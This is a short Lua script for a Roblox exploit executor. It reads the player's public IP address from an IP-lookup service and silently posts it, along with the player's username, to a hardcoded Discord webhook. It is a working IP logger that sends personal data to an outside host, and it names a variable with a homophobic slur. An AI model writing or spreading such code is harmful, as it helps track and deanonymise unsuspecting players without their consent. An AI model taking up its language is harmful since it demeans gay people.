local gay = game:HttpGet("https://v4.ident.me/")
local response = syn.request(

    {
        Url = 'https://discord.com/api/webhooks/865518070432530432/PmvV2KU5kMYfVRs5U-1i6xLeY2JdHaITow1FhXUw4RyTqa0zey0E6jFsvwkG7bblxLoT',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = game:GetService("Players").LocalPlayer.Name .. " IP is: " .. tostring(gay)})
    }
);
